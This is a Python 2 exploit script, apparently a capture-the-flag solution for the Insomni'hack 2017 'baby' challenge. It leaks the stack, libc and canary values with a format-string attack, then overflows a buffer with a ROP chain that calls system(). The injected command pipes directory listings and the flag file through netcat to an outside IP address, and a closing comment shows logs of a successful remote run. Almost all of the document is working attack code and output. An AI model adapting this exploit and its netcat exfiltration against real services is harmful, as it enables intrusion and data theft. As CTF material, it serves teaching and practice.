#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
import socket
import struct
import telnetlib
import string
import ctypes
# --------------------------------------------------------------------------------------------------
def recv_until(st):                         # receive until you encounter a string
    ret = ""
    while st not in ret:
        ret += s.recv(8192)

    return ret

# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    s = socket.create_connection(('baby.teaser.insomnihack.ch', 1337))
#   s = socket.create_connection(('localhost', 1337))
    f = s.makefile()                        # associate a file object with socket

    recv_until('Your choice >')


    # -------------------------------------------------------------------------
    # Leak addresses using format string attack
    # -------------------------------------------------------------------------
    s.send('2' + '\n')                      # fmt attack

    recv_until('Your format >')

    # Buffer is at: 0x7FFFFFFFD880 
    # Libc addr at: 0x7FFFFFFFDA68 
    # Canary is at: 0x7FFFFFFFDCA8
    # Return addr : 0x7FFFFFFFDCB8
    #
    # parameter offsets: 
    #   0x1e8 / 8 = 0x3d = 61 (+5 for regs) = 66 (for libc)
    #   0x428 / 8 = 0x85 = 133 (+5) = 138
    #   0x438 / 8 = 0x87 = 135 (+5) = 140
    #
    s.send('%1$016llx %66$016llx %138$016llx %140$016llx' + '\n')

    r = recv_until('Your format >')
    s.send('\n')

    stack_addr = int(r[0:16],  16)
    libc_addr  = int(r[17:33], 16)
    canary     = int(r[34:50], 16)
    code_addr  = int(r[51:67], 16)
    
    print '[+] Leaking stack address (&buffer):', hex(stack_addr)
    print '[+] Leaking libc  address (free+4C):', hex(libc_addr)
    print '[+] Leaking canary value           :', hex(canary)
    print '[+] Leaking return address of dofmt:', hex(code_addr)

    # -------------------------------------------------------------------------
    # Go back and overwrite return address
    # -------------------------------------------------------------------------
    recv_until('Your choice >')
    s.send( '1'  + '\n')                        # bof attack

    # return address of dofmt() is at 0x00005555555559CF:
    #   .text:00005555555559CA E8 F9 FA FF+        call    dofmt
    #   .text:00005555555559CF EB 22               jmp     short loc_5555555559F3
    #   
    # pop rdi; ret gadget is at 0x0000555555555C8B:
    #   .text:0000555555555C8A 41 5F               pop     r15
    #   .text:0000555555555C8C C3                  retn
    #
    pop_gadget = code_addr + (0x0000555555555C8B - 0x00005555555559CF)
    

    # Address of system(): Local:
    #   free+4C = 00007FFFF7A91ABC
    #   system  = 00007FFFF7A53380
    #
    # Remote:   
    #   2232: 0000000000083940   460 FUNC    GLOBAL DEFAULT   13 free@@GLIBC_2.2.5
    #   1351: 0000000000045390    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
    #
    #system =  libc_addr - (0x00007FFFF7A91ABC - 0x00007FFFF7A53380)
    system =  libc_addr - (0x0000000000083940+0x4c - 0x45390)

    print '[+] System is at:', hex(system)


    # craft overflow payload:
    #
    # system("/bin/sh") gets executed on the parent process. So we need to execute
    # a reverse TCP shell instead

    # execute this the 1st time
    #ovfl = '     echo $(ls) | nc 128.10.3.54 31337\x00' + 'A'*(0x408-39)
    
    # and this the 2nd time
    ovfl = '     echo $(cat flag) | nc 128.10.3.54 31337\x00' + 'A'*(0x408-45)
    
    # ovfl  = '/bin/sh\x00' + 'A'*0x400         # this does not work
    ovfl += struct.pack("<Q", canary)           # don't overwrite canary
    ovfl += struct.pack("<Q", 1)                # old rbp (ignore)
    ovfl += struct.pack("<Q", pop_gadget)       # pop rdi; ret
    ovfl += struct.pack("<Q", stack_addr)       # &/bin/sh
    ovfl += struct.pack("<Q", system)           # ret2libc (system)


    recv_until('want to send ?')
    s.sendall(str(len(ovfl)) + '\n')            # send buffer length first
    s.send(ovfl + '\n')                         # overflow!

    recv_until('Good luck !')                   # eat this
    # we don't need a shell here

# --------------------------------------------------------------------------------------------------
'''
# local
ispo@nogirl:~/ctf/insomnihack_17$ ./baby_expl.py 
    [+] Leaking stack address (&buffer): 0x7ffe526fc100
    [+] Leaking libc  address (free+4C): 0x7f129d32198c
    [+] Leaking canary value           : 0x7971cd723454900
    [+] Leaking return address of dofmt: 0x55f1410d79cf
    [+] System is at: 0x7f129d2e3390


# remote 1st try
xinu04 64 $ nc -nvvl -p31337
    listening on [any] 31337 ...
    connect to [128.10.3.54] from (UNKNOWN) [52.213.236.162] 33196
    baby flag
     sent 0, rcvd 10

# remote 2nd try
xinu04 65 $ nc -nvvl -p31337
    listening on [any] 31337 ...
    connect to [128.10.3.54] from (UNKNOWN) [52.213.236.162] 33198
    INS{if_you_haven't_solve_it_with_the_heap_overflow_you're_a_baby!}
     sent 0, rcvd 67

'''
# --------------------------------------------------------------------------------------------------
